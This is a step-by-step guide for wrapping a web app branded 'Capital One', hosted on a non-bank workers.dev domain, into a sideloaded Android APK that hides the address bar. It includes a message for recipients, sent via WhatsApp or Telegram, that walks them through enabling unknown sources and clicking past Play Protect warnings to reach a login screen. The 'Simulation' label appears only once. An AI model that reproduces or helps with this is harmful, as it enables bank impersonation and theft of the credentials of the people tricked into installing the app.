# TWA → APK Packaging & Sharing (Zero Cost, No Play Store)

Package any PWA into a **directly installable, shareable APK** using only free
tools (PWABuilder or Bubblewrap). No Google Play, no $25 fee, no paid services.

This app's live URL: `https://capitalone.hudson-ofccl.workers.dev/`
Target package id: `com.hudson.capitalone`

> Reusable for **any** PWA URL — see [§6 Reusable Framework](#6-reusable-framework-any-pwa).

---

## 0. Pre-flight (already satisfied by this repo)

A PWA installs as a TWA only if these exist. All are already true here — verify
in the PWABuilder report, and **never edit the web source to fix them**:

| Requirement | Status | Location |
|---|---|---|
| Web manifest | ✅ | `public/manifest.json` (name, short_name, start_url, display: standalone) |
| 192 + 512 + maskable icons | ✅ | `public/icons/` |
| Service worker (offline) | ✅ | `public/sw.js` |
| HTTPS | ✅ | Cloudflare |

If PWABuilder flags anything missing, use its built-in "Add a manifest / service
worker" helpers — do **not** modify the deployed source.

---

## 1. Generate the APK (PWABuilder method — recommended)

1. Open **[pwabuilder.com](https://pwabuilder.com)**.
2. Enter: `https://capitalone.hudson-ofccl.workers.dev/` → **Start**.
3. Wait for the report (should be mostly green).
4. **Package for stores** → **Android** tab.
5. **Generate Package** → choose the **"Other Android"** option (this yields an
   installable **APK**; "Google Play" yields an AAB — do NOT pick that).
6. Configure:
   - **App name:** `Capital One`
   - **Package ID:** `com.hudson.capitalone` (must be globally unique)
   - **Display mode:** **Fullscreen** (hides the status bar; no address bar in TWA)
   - **Start URL:** `/`
   - **Icon:** `public/icons/icon-512.png` (already 512×512)
7. **Download Package** → a `.zip` containing:
   - `*.apk` (the installable app)
   - `signing.keystore` + `signing-key-info.txt`
   - `assetlinks.json`
8. **SAVE THE KEYSTORE.** Back it up (password manager / encrypted drive). You
   must reuse the **same** keystore to ship updates; losing it means users can't
   update over the installed app.

> Note the **SHA-256 fingerprint** printed in `signing-key-info.txt` /
> `assetlinks.json` — Step 2 needs it.

---

## 2. Deploy `assetlinks.json` (the address-bar killer)

Android verifies that the APK and the site share an owner via
`/.well-known/assetlinks.json`. Wrong/missing/redirected ⇒ **the URL bar
reappears**.

**Generate the file here (one command), substituting your fingerprint:**

```bash
node scripts/gen-assetlinks.mjs --package com.hudson.capitalone --sha256 "AA:BB:CC:...:FF"
```

That writes `public/.well-known/assetlinks.json`:

```json
[{
  "relation": ["delegate_permission/common.handle_all_urls"],
  "target": {
    "namespace": "android_app",
    "package_name": "com.hudson.capitalone",
    "sha256_cert_fingerprints": ["AA:BB:CC:...:FF"]
  }
}]
```

**Ship it + the correct headers, then deploy:**

```bash
npm run build
npx wrangler deploy
```

`public/_headers` already forces the right `Content-Type` (no redirects):

```
/.well-known/assetlinks.json
  Content-Type: application/json
  Cache-Control: public, max-age=3600
```

**Verify (must be a 200, `application/json`, no redirect, no `text/html`):**

```bash
curl -sI https://capitalone.hudson-ofccl.workers.dev/.well-known/assetlinks.json
```

And Google's own validator:
`https://digitalassetlinks.googleapis.com/v1/statements:list?source.web.site=https://capitalone.hudson-ofccl.workers.dev&relation=delegate_permission/common.handle_all_urls`

---

## 3. Bubblewrap alternative (if PWABuilder fails)

Requires Java 17+ and the Android SDK (both free). Bubblewrap fetches the SDK
on first run.

```bash
npm i -g @bubblewrap/cli

# Reads the live manifest and pre-fills everything:
bubblewrap init --manifest="https://capitalone.hudson-ofccl.workers.dev/manifest.json"
```

Answer the prompts:

| Prompt | Value |
|---|---|
| Application name | `Capital One` |
| Short name | `Capital One` |
| Application ID | `com.hudson.capitalone` |
| Display mode | `fullscreen` (or `standalone`) |
| Status bar color | `#005C9D` |
| Splash screen color | `#005C9D` |
| Icon URL | `https://capitalone.hudson-ofccl.workers.dev/icons/icon-512.png` |
| Signing key | let it **create** one, or reuse your PWABuilder keystore |

Then build the APK:

```bash
bubblewrap build
# → app-release-signed.apk   ← share this file
```

`bubblewrap build` also prints the SHA-256 fingerprint — feed it into Step 2.

---

## 4. User installation guide (share with the APK)

Send this verbatim alongside `app-release-signed.apk`
(also saved as `docs/share/capitalone-install-guide.txt`):

> **Install Capital One (Simulation)**
>
> 1. Tap the **APK file** you received (WhatsApp/Telegram → Download).
> 2. Open your **Files** app, tap the APK, then tap **Install**.
> 3. If you see *"For your security, your phone can't install unknown apps from
>    this source"*, tap **Settings** and turn on **Allow from this source** for
>    the app you opened it with (Chrome/Files).
>    *(Android 8.0+: Settings → Apps → Special access → Install unknown apps →
>    pick your browser → Allow.)*
> 4. Tap **Install** again → **Open**.
> 5. Any "unsafe app" / Play Protect warning is expected for apps outside the
>    store — tap **Install anyway** / **More details → Install anyway.**
> 6. The app opens **full-screen with no address bar.** 🎉

---

## 5. Verification checklist (after install)

- [ ] **No URL bar** — opens full-screen (TWA verified). If the bar shows, the
      `assetlinks.json` is wrong: recheck fingerprint, `application/json`
      content-type, and that the URL does **not** redirect.
- [ ] **App icon** appears in the app drawer / home screen.
- [ ] **Fullscreen** — status bar hidden (uses the `display: fullscreen` you set).
- [ ] **Offline** — enable Airplane mode, reopen: the shell still loads (SW cache).
- [ ] **Functionality** — login, dashboard, and admin panel work inside the app.
- [ ] **Shareable** — re-send the APK via WhatsApp/Telegram; a fresh device
      installs it using §4.

---

## 6. Reusable framework (any PWA)

Drop-in template — replace the `{...}` tokens:

1. **Pre-flight:** URL must be HTTPS with a manifest (name, start_url, icons
   192/512/maskable) + a service worker.
2. **APK:** PWABuilder → Android → **Other Android** → Fullscreen → download
   (save keystore). Or `bubblewrap init --manifest="{URL}/manifest.json"` then `bubblewrap build`.
3. **assetlinks:** `node scripts/gen-assetlinks.mjs --package {PACKAGE_ID} --sha256 "{SHA256}"`
   → build → deploy → verify `Content-Type: application/json`, no redirects.
4. **Install guide:** reuse §4 text, swapping the app name.
5. **Verify:** §5 checklist.

| Token | This app |
|---|---|
| `{URL}` | `https://capitalone.hudson-ofccl.workers.dev/` |
| `{APP_NAME}` | `Capital One` |
| `{PACKAGE_ID}` | `com.hudson.capitalone` |
| `{SHA256}` | from `signing-key-info.txt` |

---

## Troubleshooting

| Symptom | Fix |
|---|---|
| Address bar visible | assetlinks.json fingerprint mismatch, wrong Content-Type, or redirect. Re-verify with `curl -sI`. |
| `bubblewrap` SDK errors | Install Java 17+, let Bubblewrap download the SDK, rerun. |
| "App not installed" | Uninstall any prior install of the same package id, then retry. |
| Play Protect block | Expected for sideloaded apps — **Install anyway**. |
| Can't update later | Use the **same** keystore; keep package id identical. |
| Digital Asset Links API returns empty | Not deployed yet, cached (wait/clear), or site root differs (`https://` + exact host). |
